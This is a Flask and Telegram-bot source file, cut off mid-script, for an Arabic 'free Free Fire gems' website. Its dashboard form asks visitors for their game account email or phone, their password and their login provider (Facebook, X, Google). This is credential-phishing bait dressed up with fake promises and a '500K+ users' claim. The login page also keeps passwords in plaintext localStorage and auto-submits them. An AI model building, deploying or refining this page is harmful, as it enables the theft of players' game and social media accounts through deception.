from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
import telebot
from telebot import types
import json
import os
from datetime import datetime
import requests
import hashlib
import uuid
import base64
import re
import traceback

# إعداد Flask
app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'your-secret-key-here')

# إعداد البوت
BOT_TOKEN = os.getenv('BOT_TOKEN')
if not BOT_TOKEN or BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE':
    print("❌ خطأ: لم يتم تعيين BOT_TOKEN في متغيرات البيئة")
    print("يرجى إضافة توكن البوت في Secrets")
    BOT_TOKEN = None

bot = None
if BOT_TOKEN:
    try:
        bot = telebot.TeleBot(BOT_TOKEN)
    except Exception as e:
        print(f"❌ خطأ في إنشاء البوت: {e}")

# معرف الأدمن الرئيسي
MAIN_ADMIN_ID = 8199450690  # عدّل إذا احتجت

# إعداد الـ webhook (يمكن تغييره لعنوان التطبيق الفعلي)
WEBHOOK_URL = os.getenv('REPL_URL') or os.getenv('RENDER_EXTERNAL_URL') or 'https://your-app-name.repl.co'

# قواعد البيانات البسيطة (in-memory)
users_data = {}  # بيانات المستخدمين keyed by user_id
requests_data = {}  # طلبات الجواهر keyed by user_id
admin_messages = {}  # رسائل الإدارة keyed by user_id
admins_list = [MAIN_ADMIN_ID]  # قائمة الأدمن (أرقام)

# حالات الأدمن المؤقتة
user_states = {}
temp_data = {}

# ---------------------------
# القوالب (تمت إعادة الـ CSS الأصلي كما في الملف المرفوع)
# ---------------------------
LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - شحن جواهر فري فاير</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Tajawal', sans-serif;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            background: linear-gradient(135deg, #ffffff 0%, #fff9e6 100%);
            color: #333;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .auth-container {
            background: #fff;
            border-radius: 20px;
            padding: 30px;
            width: 100%;
            max-width: 520px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
            border: 2px solid #ffd700;
        }

        .logo {
            width: 110px;
            height: 110px;
            border-radius: 50%;
            margin: 0 auto 14px;
            display: block;
            border: 3px solid #ffd700;
            object-fit: cover;
        }

        .auth-title {
            font-size: 2rem;
            font-weight: 700;
            color: #333;
            text-align: center;
            margin-bottom: 20px;
        }

        .auth-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 18px;
        }

        .tab-btn {
            flex: 1;
            padding: 14px;
            background: #f8f9fa;
            border: 2px solid #e0e0e0;
            cursor: pointer;
            font-weight: 700;
            border-radius: 10px;
            transition: all 0.15s ease;
            font-family: 'Tajawal', sans-serif;
        }

        .tab-btn.active {
            background: linear-gradient(135deg, #ffd700, #ffed4e);
            border-color: #ffd700;
            color: #333;
        }

        .form-group {
            margin-bottom: 14px;
            position: relative;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }

        .form-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 1rem;
            font-family: 'Tajawal', sans-serif;
            transition: all 0.3s ease;
            padding-right: 40px;
        }

        .form-input:focus {
            outline: none;
            border-color: #ffd700;
            box-shadow: 0 0 10px rgba(255, 215, 0, 0.12);
        }

        .password-toggle {
            position: absolute;
            top: 40px;
            left: 12px;
            cursor: pointer;
            color: #666;
            font-size: 1.2rem;
        }

        .file-input-wrapper {
            position: relative;
            display: inline-block;
            width: 100%;
        }

        .file-input {
            position: absolute;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
        }

        .file-input-display {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 14px;
            border: 2px dashed #ffd700;
            border-radius: 10px;
            background: #fff9e6;
            font-weight: 600;
            cursor: pointer;
            font-family: 'Tajawal', sans-serif;
        }

        .preview-image {
            max-width: 200px;
            max-height: 200px;
            border-radius: 10px;
            margin: 10px auto;
            display: none;
        }

        .btn {
            background: linear-gradient(135deg, #ffd700, #ffed4e);
            color: #333;
            border: none;
            padding: 15px 40px;
            border-radius: 25px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Tajawal', sans-serif;
            width: 100%;
            margin-bottom: 15px;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(255, 215, 0, 0.4);
        }

        .btn-secondary {
            background: #f8f9fa;
            color: #333;
            border: 2px solid #e0e0e0;
            padding: 12px 18px;
            border-radius: 12px;
            cursor: pointer;
            font-weight: 700;
            font-family: 'Tajawal', sans-serif;
        }

        .error-message {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
            padding: 12px;
            border-radius: 10px;
            margin: 12px 0;
            display: none;
        }

        .success-message {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
            padding: 12px;
            border-radius: 10px;
            margin: 12px 0;
            display: none;
        }

        .tab-btn:first-child {
            border-radius: 10px 0 0 10px;
            border-left: 2px solid #e0e0e0;
        }

        .tab-btn:last-child {
            border-radius: 0 10px 10px 0;
            border-right: 2px solid #e0e0e0;
        }

        .tab-btn.active:first-child {
            border-left-color: #ffd700;
        }

        .tab-btn.active:last-child {
            border-right-color: #ffd700;
        }

        /* Modal styles */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.6);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            display: none;
        }
        
        .modal {
            background: white;
            border-radius: 20px;
            padding: 30px;
            width: 90%;
            max-width: 500px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            position: relative;
            border: 3px solid #ffd700;
        }
        
        .modal-title {
            font-size: 1.5rem;
            font-weight: 700;
            text-align: center;
            margin-bottom: 20px;
            color: #333;
        }
        
        .modal-content {
            font-size: 1.1rem;
            text-align: center;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        
        .modal-btn {
            background: linear-gradient(135deg, #ffd700, #ffed4e);
            color: #333;
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            display: block;
            margin: 0 auto;
            font-family: 'Tajawal', sans-serif;
            transition: all 0.3s ease;
        }
        
        .modal-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 15px rgba(255, 215, 0, 0.3);
        }
        
        .close-modal {
            position: absolute;
            top: 15px;
            left: 15px;
            font-size: 1.5rem;
            cursor: pointer;
            color: #666;
        }

        /* responsiveness */
        @media (max-width: 480px) {
            .auth-container { padding: 18px; }
            .auth-title { font-size: 1.5rem; }
            .tab-btn { font-size: 0.95rem; padding: 10px; }
            .preview-image { max-width: 160px; max-height: 160px; }
        }
        
        /* التعليمات الإضافية */
        .instructions {
            background: #fff8e6;
            border: 1px solid #ffd700;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            color: #333;
        }
        
        .instructions h3 {
            text-align: center;
            margin-bottom: 10px;
            color: #e44d26;
        }
        
        .instructions ul {
            padding-right: 20px;
            line-height: 1.6;
        }
        
        .instructions li {
            margin-bottom: 8px;
        }
    </style>
</head>
<body>
    <div class="auth-container">
        <img src="https://i.postimg.cc/BZ8r90LK/102a5b7ea35ab8cce5b61aad6ddde212.jpg" alt="شعار فري فاير" class="logo">
        <h1 class="auth-title">منصة فري فاير</h1>
        
        <!-- التعليمات الإضافية للمستخدمين -->
        <div class="instructions">
            <h3>🌟 تعليمات الاستخدام 🌟</h3>
            <ul>
                <li>إذا كنت جديداً على المنصة، اختر <strong>إنشاء حساب</strong> لتسجيل نفسك</li>
                <li>إذا كان لديك حساب بالفعل، اختر <strong>تسجيل الدخول</strong></li>
                <li>بعد تسجيل الدخول، سيتم تذكرك في المرة القادمة</li>
                <li>إذا نسيت كلمة المرور، تواصل مع الدعم الفني</li>
            </ul>
        </div>
        
        <div class="auth-tabs">
            <button id="tab-login" class="tab-btn active" onclick="switchTab('login', 0)">تسجيل الدخول</button>
            <button id="tab-register" class="tab-btn" onclick="switchTab('register', 1)">إنشاء حساب</button>
        </div>

        <div id="error-message" class="error-message"></div>
        <div id="success-message" class="success-message"></div>

        <!-- تسجيل الدخول -->
        <div id="login-section" class="form-section active">
            <form id="loginForm">
                <div class="form-group">
                    <label class="form-label">البريد الإلكتروني:</label>
                    <input type="email" class="form-input" name="email" id="login-email" required>
                </div>
                
                <div class="form-group">
                    <label class="form-label">كلمة المرور:</label>
                    <input type="password" class="form-input" name="password" id="login-password" required>
                    <i class="fas fa-eye password-toggle" onclick="togglePassword('login-password', this)"></i>
                </div>
                
                <!-- خيار تذكرني -->
                <div class="form-group" style="display:flex;align-items:center;gap:8px">
                    <input type="checkbox" id="remember-me" name="remember_me" checked>
                    <label for="remember-me" style="font-weight:500">تذكرني على هذا الجهاز</label>
                </div>
                
                <button type="submit" class="btn">دخول</button>
            </form>
        </div>

        <!-- إنشاء حساب -->
        <div id="register-section" class="form-section" style="display:none;">
            <form id="registerForm" enctype="multipart/form-data">
                <div class="form-group">
                    <label class="form-label">صورة الحساب:</label>
                    <div class="file-input-wrapper">
                        <input type="file" class="file-input" name="profileImage" accept="image/*" required>
                        <div class="file-input-display">
                            <span>📸 اختر صورة حسابك</span>
                        </div>
                    </div>
                    <img id="preview" class="preview-image">
                </div>
                
                <div class="form-group">
                    <label class="form-label">الاسم:</label>
                    <input type="text" class="form-input" name="name" required>
                </div>
                
                <div class="form-group">
                    <label class="form-label">البريد الإلكتروني:</label>
                    <input type="email" class="form-input" name="email" id="register-email" required>
                </div>
                
                <div class="form-group">
                    <label class="form-label">كلمة المرور:</label>
                    <input type="password" class="form-input" name="password" id="register-password" required>
                    <i class="fas fa-eye password-toggle" onclick="togglePassword('register-password', this)"></i>
                </div>
                
                <!-- خيار تذكرني للتسجيل -->
                <div class="form-group" style="display:flex;align-items:center;gap:8px">
                    <input type="checkbox" id="remember-me-register" name="remember_me" checked>
                    <label for="remember-me-register" style="font-weight:500">تذكرني على هذا الجهاز</label>
                </div>
                
                <button type="submit" class="btn">إنشاء حساب</button>
            </form>
        </div>
    </div>

    <!-- Modal for messages -->
    <div id="modalOverlay" class="modal-overlay">
        <div class="modal">
            <span class="close-modal" onclick="closeModal()">&times;</span>
            <h2 id="modalTitle" class="modal-title"></h2>
            <p id="modalContent" class="modal-content"></p>
            <button id="modalActionBtn" class="modal-btn" onclick="handleModalAction()"></button>
        </div>
    </div>

    <script>
        // التحقق من وجود بيانات تسجيل دخول محفوظة
        function checkSavedLogin() {
            const savedEmail = localStorage.getItem('saved_email');
            const savedPassword = localStorage.getItem('saved_password');
            
            if (savedEmail && savedPassword) {
                document.getElementById('login-email').value = savedEmail;
                document.getElementById('login-password').value = savedPassword;
                
                // محاولة تسجيل الدخول التلقائي بعد تحميل الصفحة
                setTimeout(() => {
                    document.querySelector('#loginForm button[type="submit"]').click();
                }, 500);
            }
        }
        
        // استدعاء التحقق عند تحميل الصفحة
        window.addEventListener('DOMContentLoaded', checkSavedLogin);
        
        function switchTab(tab, idx) {
            // إخفاء جميع الأقسام
            document.querySelectorAll('.form-section').forEach(section => section.style.display = 'none');
            document.getElementById('login-section').style.display = (tab === 'login') ? 'block' : 'none';
            document.getElementById('register-section').style.display = (tab === 'register') ? 'block' : 'none';

            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            if (idx === 0) document.getElementById('tab-login').classList.add('active');
            if (idx === 1) document.getElementById('tab-register').classList.add('active');

            hideMessages();
        }

        function showError(message) {
            const errorDiv = document.getElementById('error-message');
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
            document.getElementById('success-message').style.display = 'none';
        }

        function showSuccess(message) {
            const successDiv = document.getElementById('success-message');
            successDiv.textContent = message;
            successDiv.style.display = 'block';
            document.getElementById('error-message').style.display = 'none';
        }

        function hideMessages() {
            document.getElementById('error-message').style.display = 'none';
            document.getElementById('success-message').style.display = 'none';
        }

        // معاينة الصورة
        document.querySelector('input[name="profileImage"]').addEventListener('change', function(e) {
            const file = e.target.files[0];
            const preview = document.getElementById('preview');
            const display = document.querySelector('.file-input-display span');
            
            if (file) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    preview.src = e.target.result;
                    preview.style.display = 'block';
                    display.textContent = '✅ تم اختيار الصورة';
                };
                reader.readAsDataURL(file);
            }
        });

        // تبديل رؤية كلمة المرور
        function togglePassword(inputId, icon) {
            const input = document.getElementById(inputId);
            if (input.type === 'password') {
                input.type = 'text';
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                input.type = 'password';
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        }

        // تسجيل الدخول
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const formData = new FormData(this);
            const data = Object.fromEntries(formData);
            const rememberMe = document.getElementById('remember-me').checked;
            
            // حفظ بيانات تسجيل الدخول إذا تم اختيار "تذكرني"
            if (rememberMe) {
                localStorage.setItem('saved_email', data.email);
                localStorage.setItem('saved_password', data.password);
            } else {
                localStorage.removeItem('saved_email');
                localStorage.removeItem('saved_password');
            }
            
            fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({...data, remember_me: rememberMe})
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    window.location.href = '/dashboard';
                } else {
                    showError(data.message || 'فشل في تسجيل الدخول');
                }
            })
            .catch(error => {
                showError('حدث خطأ في الاتصال');
            });
        });

        // إنشاء حساب
        document.getElementById('registerForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const formData = new FormData(this);
            const email = document.getElementById('register-email').value;
            const password = document.getElementById('register-password').value;
            const rememberMe = document.getElementById('remember-me-register').checked;
            
            // حفظ بيانات تسجيل الدخول إذا تم اختيار "تذكرني"
            if (rememberMe) {
                localStorage.setItem('saved_email', email);
                localStorage.setItem('saved_password', password);
            }
            
            fetch('/register', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showModal('نجاح', 'تم إنشاء الحساب بنجاح!', 'انتقل لتسجيل الدخول', 'login');
                } else {
                    showModal('خطأ', data.message || 'فشل في إنشاء الحساب', 'حاول مرة أخرى', 'error');
                }
            })
            .catch(error => {
                showModal('خطأ', 'حدث خطأ في الاتصال', 'حاول مرة أخرى', 'error');
            });
        });

        // Modal functions
        function showModal(title, content, btnText, type) {
            document.getElementById('modalTitle').textContent = title;
            document.getElementById('modalContent').textContent = content;
            document.getElementById('modalActionBtn').textContent = btnText;
            
            // Set button style based on type
            const modalBtn = document.getElementById('modalActionBtn');
            if (type === 'login') {
                modalBtn.style.background = 'linear-gradient(135deg, #ffd700, #ffed4e)';
            } else {
                modalBtn.style.background = 'linear-gradient(135deg, #ff6b6b, #ff8e8e)';
            }
            
            document.getElementById('modalOverlay').style.display = 'flex';
        }

        function closeModal() {
            document.getElementById('modalOverlay').style.display = 'none';
        }

        function handleModalAction() {
            const btnText = document.getElementById('modalActionBtn').textContent;
            if (btnText === 'انتقل لتسجيل الدخول') {
                // تعبئة تلقائية للبيانات
                const email = localStorage.getItem('saved_email') || '';
                const password = localStorage.getItem('saved_password') || '';
                
                document.getElementById('login-email').value = email;
                document.getElementById('login-password').value = password;
                
                switchTab('login', 0);
            }
            closeModal();
        }
    </script>
</body>
</html>
'''

DASHBOARD_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>لوحة التحكم - شحن جواهر فري فاير</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Tajawal', sans-serif;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            background: linear-gradient(135deg, #ffffff 0%, #fff9e6 100%);
            color: #333;
            min-height: 100vh;
        }

        .navbar {
            background: linear-gradient(135deg, #ffd700, #ffed4e);
            padding: 18px 0;
            box-shadow: 0 6px 20px rgba(0,0,0,0.06);
            border-bottom-left-radius: 8px;
            border-bottom-right-radius: 8px;
        }

        .nav-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .nav-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .nav-logo {
            width: 64px;
            height: 64px;
            border-radius: 50%;
            border: 3px solid rgba(255,255,255,0.6);
            object-fit: cover;
        }

        .nav-welcome {
            font-weight: 700;
            font-size: 1rem;
            color: #222;
        }

        .logout-btn {
            background: #fff;
            color: #333;
            border: none;
            padding: 8px 14px;
            border-radius: 18px;
            cursor: pointer;
            font-weight: 700;
            box-shadow: 0 6px 12px rgba(255,255,255,0.2);
            font-family: 'Tajawal', sans-serif;
        }

        .container {
            max-width: 1200px;
            margin: 22px auto;
            padding: 20px;
        }

        .welcome-section, .section {
            background: #fff;
            border-radius: 14px;
            padding: 20px;
            margin-bottom: 18px;
            box-shadow: 0 12px 30px rgba(0,0,0,0.06);
            border: 2px solid #ffd700;
        }

        .section-title {
            text-align: center;
            font-size: 1.3rem;
            font-weight: 700;
            color: #333;
            margin-bottom: 12px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 14px;
            margin-bottom: 16px;
        }

        .stat-card {
            background: linear-gradient(135deg, #ffd700, #ffed4e);
            border-radius: 12px;
            padding: 18px;
            text-align: center;
            color: #333;
        }

        .gems-form .form-group {
            margin-bottom: 12px;
            position: relative;
        }

        .form-label { display:block;margin-bottom:6px;font-weight:700;color:#333; }
        .form-input { 
            width:100%;
            padding:10px;
            border:2px solid #eee;
            border-radius:10px;
            font-size:1rem;
            font-family: 'Tajawal', sans-serif;
            padding-right: 40px;
        }
        
        .password-toggle {
            position: absolute;
            top: 33px;
            left: 12px;
            cursor: pointer;
            color: #666;
            font-size: 1.2rem;
        }
        
        .custom-select {
            width:100%;
            padding:10px;
            border:2px solid #eee;
            border-radius:10px;
            font-size:1rem;
            font-family: 'Tajawal', sans-serif;
            background-color: #fff;
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
        }
        
        .custom-select .value {
            color: #777;
        }
        
        .custom-select .icon {
            transition: transform 0.3s;
        }
        
        .select-options {
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background: #fff;
            border: 2px solid #eee;
            border-radius: 10px;
            margin-top: 5px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            z-index: 10;
            display: none;
            max-height: 200px;
            overflow-y: auto;
        }
        
        .select-option {
            padding: 10px 15px;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .select-option:hover {
            background: #f8f9fa;
        }
        
        .select-option.selected {
            background: #ffed4e;
            font-weight: 700;
        }

        .btn { 
            background: linear-gradient(135deg, #ffd700, #ffed4e); 
            color:#333; 
            border:none; 
            padding:10px 14px; 
            border-radius:22px; 
            font-size:1rem; 
            font-weight:700; 
            cursor:pointer; 
            width:100%; 
            box-shadow:0 8px 18px rgba(255,215,0,0.12);
            font-family: 'Tajawal', sans-serif;
        }

        .requests-list { max-height: 360px; overflow-y:auto; padding:6px; }
        .request-item { 
            background:#f8f9fa;
            border-radius:10px;
            padding:14px;
            margin-bottom:10px;
            border-right:5px solid #ffd700;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        
        .request-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .request-id {
            font-weight: 700;
            background: #ffed4e;
            padding: 3px 8px;
            border-radius: 5px;
            font-size: 0.9rem;
        }
        
        .request-date {
            font-size:0.9rem;
            color:#666;
        }
        
        .request-details {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        
        .request-detail {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .request-detail i {
            color: #ffd700;
            width: 20px;
            text-align: center;
        }
        
        .messages-list { max-height:260px; overflow-y:auto; padding:6px; }
        .message-item { 
            background:#eaf4ff;
            border-radius:10px;
            padding:12px;
            margin-bottom:8px;
            border-right:4px solid #2196f3;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        
        .message-header {
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 700;
        }
        
        .message-header i {
            color: #2196f3;
        }

        .empty-state { 
            text-align:center;
            color:#666;
            font-style:italic;
            padding:28px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
        }
        
        .empty-state i {
            font-size: 2.5rem;
            color: #ccc;
        }

        /* Modal styles */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.6);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            display: none;
        }
        
        .modal {
            background: white;
            border-radius: 20px;
            padding: 30px;
            width: 90%;
            max-width: 500px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            position: relative;
            border: 3px solid #ffd700;
        }
        
        .modal-title {
            font-size: 1.5rem;
            font-weight: 700;
            text-align: center;
            margin-bottom: 20px;
            color: #333;
        }
        
        .modal-content {
            font-size: 1.1rem;
            text-align: center;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        
        .modal-btn {
            background: linear-gradient(135deg, #ffd700, #ffed4e);
            color: #333;
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            display: block;
            margin: 0 auto;
            font-family: 'Tajawal', sans-serif;
            transition: all 0.3s ease;
        }
        
        .modal-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 15px rgba(255, 215, 0, 0.3);
        }
        
        .close-modal {
            position: absolute;
            top: 15px;
            left: 15px;
            font-size: 1.5rem;
            cursor: pointer;
            color: #666;
        }

        @media (max-width:700px) {
            .nav-welcome { font-size:0.95rem; }
            .nav-logo { width:52px;height:52px; }
        }
        
        /* ملاحظة التحديث */
        .refresh-note {
            background: #eaf4ff;
            border: 1px solid #2196f3;
            border-radius: 8px;
            padding: 10px;
            margin-top: 10px;
            text-align: center;
            color: #333;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="nav-container">
            <div class="nav-left">
                <img src="{{ user.image }}" alt="logo" class="nav-logo">
                <div class="nav-welcome">مرحباً، <strong>{{ user.name }}</strong></div>
            </div>
            <div>
                <button class="logout-btn" onclick="logout()">خروج</button>
            </div>
        </div>
    </nav>

    <div class="container">
        <div class="welcome-section">
            <h2 style="font-size:1.2rem">🌟 مرحباً بك في منصة شحن الجواهر 🌟</h2>
            <p style="margin-top:10px;color:#555">أرسل طلب جواهر وسنعاود التواصل معك عندما تتم الموافقة.</p>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div style="font-size:1.25rem;font-weight:800">{{ stats.total_requests }}</div>
                <div>إجمالي طلباتي</div>
            </div>
            <div class="stat-card">
                <div style="font-size:1.25rem;font-weight:800">{{ stats.admin_messages }}</div>
                <div>رسائل الإدارة</div>
            </div>
            <div class="stat-card">
                <div style="font-size:1.25rem;font-weight:800">500K+</div>
                <div>مستخدم راضٍ</div>
            </div>
        </div>

        <!-- قسم طلب جواهر -->
        <div class="section">
            <h2 class="section-title">💎 طلب جواهر جديد</h2>
            <div class="gems-form">
                <form id="gemsForm">
                    <div class="form-group">
                        <label class="form-label">الاسم :</label>
                        <input type="text" class="form-input" name="fullName" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">ID فري فاير:</label>
                        <input type="text" class="form-input" name="freeFireId" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">رقم الهاتف أو البريد الإلكتروني:</label>
                        <input type="text" class="form-input" name="emailOrPhone" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">كلمة المرور:</label>
                        <input type="password" class="form-input" name="password" id="gems-password" required>
                        <i class="fas fa-eye password-toggle" onclick="togglePassword('gems-password', this)"></i>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">نوع التسجيل:</label>
                        <div class="custom-select" onclick="toggleSelectOptions()">
                            <span class="value" id="selected-type">اختر نوع التسجيل</span>
                            <i class="fas fa-chevron-down icon"></i>
                        </div>
                        <input type="hidden" name="registrationType" id="registration-type" required>
                        <div class="select-options" id="select-options">
                            <div class="select-option" onclick="selectOption('facebook', '📘 فايسبوك')">📘 فايسبوك</div>
                            <div class="select-option" onclick="selectOption('twitter', '🐦 X (تويتر)')">🐦 X (تويتر)</div>
                            <div class="select-option" onclick="selectOption('google', '🔍 قوقل')">🔍 قوقل</div>
                        </div>
                    </div>
                    
                    <button type="submit" class="btn">🚀 إرسال طلب الجواهر</button>
                </form>

                <!-- الملاحظات المطلوبة (مضافة حسب طلب المستخدم) -->
                <div class="gems-notes" style="margin-top:12px;background:#fff8e6;border:1px solid #ffe8b3;padding:12px;border-radius:8px;color:#333">
                    <strong>ملاحظة مهمة:</strong>
                    <ul style="margin-top:8px;padding-inline-start:18px;line-height:1.6">
                        <li>تأكد من إدخال جميع البيانات بشكل صحيح</li>
                        <li>ID فري فاير يمكن العثور عليه في إعدادات اللعبة</li>
                        <li>اختر نوع التسجيل الذي استخدمته عند إنشاء الحساب</li>
                        <li>يجب أن تكون البيانات المرسلة للحساب هو الحساب الرئيسي وليس الحساب المربوط</li>
                        <li>يجب أن يكون الحساب المسجل به غير مربوط بأي حساب آخر</li>
                    </ul>

                    <ol style="margin-top:8px;padding-inline-start:18px;line-height:1.6">
                        <li><strong>التحقق من الحساب</strong><br>بعد إرسال المعلومات، سيتم التحقق من صحة حسابك وأهليته للحصول على الجواهر</li>
                        <li style="margin-top:6px"><strong>استلام الجواهر</strong><br>إذا كان حسابك يوافي الشروط، ستستلم الجواهر خلال يوم أو أكثر</li>
                    </ol>
                </div>
            </div>
        </div>

        <!-- عرض الطلبات والرسائل (كما كان أصلًا) -->
        <div class="section">
            <h2 class="section-title">📋 طلباتي السابقة</h2>
            <div class="requests-list">
                {% if user_requests %}
                    {% for request in user_requests %}
                    <div class="request-item">
                        <div class="request-header">
                            <span class="request-id">طلب #{{ request.id }}</span>
                            <span class="request-date">{{ request.date }}</span>
                        </div>
                        <div class="request-details">
                            <div class="request-detail">
                                <i class="fas fa-user"></i>
                                <span><strong>الاسم:</strong> {{ request.fullName }}</span>
                            </div>
                            <div class="request-detail">
                                <i class="fas fa-id-card"></i>
                                <span><strong>ID:</strong> {{ request.freeFireId }}</span>
                            </div>
                            <div class="request-detail">
                                <i class="fas fa-key"></i>
                                <span><strong>نوع التسجيل:</strong> {{ request.registrationType }}</span>
                            </div>
                        </div>
                    </div>
                    {% endfor %}
                {% else %}
                    <div class="empty-state">
                        <i class="fas fa-inbox"></i>
                        <div>لم تقم بإرسال أي طلبات بعد</div>
                    </div>
                {% endif %}
            </div>
        </div>

        <div class="section">
            <h2 class="section-title">📬 رسائل الإدارة</h2>
            <div class="messages-list">
                {% if admin_messages_for_user %}
                    {% for message in admin_messages_for_user %}
                    <div class="message-item">
                        <div class="message-header">
                            <i class="fas fa-envelope"></i>
                            <span>رسالة - {{ message.date }}</span>
                        </div>
                        <div style="color:#222">{{ message.content }}</div>
                    </div>
                    {% endfor %}
                {% else %}
                    <div class="empty-state">
                        <i class="fas fa-envelope-open"></i>
                        <div>لا توجد رسائل من الإدارة</div>
                    </div>
                {% endif %}
            </div>
            <!-- ملاحظة التحديث -->
            <div class="refresh-note">
                <i class="fas fa-sync-alt"></i>
                ملاحظة: يمكنك سحب الصفحة لأعلى لتحديثها ورؤية أحدث الرسائل
            </div>
        </div>

    </div>

    <!-- Modal for gems request -->
    <div id="gemsModalOverlay" class="modal-overlay">
        <div class="modal">
            <span class="close-modal" onclick="closeGemsModal()">&times;</span>
            <h2 id="gemsModalTitle" class="modal-title"></h2>
            <p id="gemsModalContent" class="modal-content"></p>
            <button id="gemsModalBtn" class="modal-btn" onclick="closeGemsModal()">حسناً</button>
        </div>
    </div>

    <script>
        // تبديل رؤية كلمة المرور
        function togglePassword(inputId, icon) {
            const input = document.getElementById(inputId);
            if (input.type === 'password') {
                input.type = 'text';
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                input.type = 'password';
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        }
        
        // إدارة نوع التسجيل
        function toggleSelectOptions() {
            const options = document.getElementById('select-options');
            const icon = document.querySelector('.custom-select .icon');
            
            if (options.style.display === 'block') {
                options.style.display = 'none';
                icon.classList.remove('fa-chevron-up');
                icon.classList.add('fa-chevron-down');
            } else {
                options.style.display = 'block';
                icon.classList.remove('fa-chevron-down');
                icon.classList.add('fa-chevron-up');
            }
        }
        
        function selectOption(value, text) {
            document.getElementById('selected-type').textContent = text;
            document.getElementById('registration-type').value = value;
            document.querySelectorAll('.select-option').forEach(opt => opt.classList.remove('selected'));
            event.currentTarget.classList.add('selected');
            toggleSelectOptions();
        }
        
        // إغلاق القائمة عند النقر خارجها
        document.addEventListener('click', function(event) {
